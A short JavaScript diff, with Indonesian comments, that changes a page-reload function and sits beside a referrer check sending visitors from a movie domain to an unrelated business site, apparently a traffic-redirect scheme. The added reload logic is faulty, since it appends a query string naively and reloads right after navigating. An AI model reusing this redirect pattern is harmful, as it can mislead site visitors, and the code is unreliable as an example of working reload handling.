@@ -41,7 +41,13 @@ var mainDomain = window.location.hostname.split('.').slice(-2).join('.');
 
 // Fungsi untuk reload halaman
 function reloadPage() {
-    location.reload(); // Memuat ulang halaman
+    // Cek apakah sudah pernah dilakukan reload sebelumnya
+    var isReloaded = getParameterByName('reloaded');
+    if (!isReloaded) {
+        // Tambahkan parameter 'reloaded' ke URL untuk menandai bahwa reload sudah dilakukan
+        window.location.href = window.location.href + '?reloaded=true';
+        location.reload(); // Memuat ulang halaman
+    }
 }
 
 // Jika pengunjung akses langsung atau hasilnya dari redirect dari https://movies2392.pages.dev,
@@ -54,6 +60,7 @@ if (document.referrer.includes("movies2392.pages.dev") || window.location.hostna
         window.location.href = "https://business.faridahdecoration.com/";
     }
 }
+
 
 
 
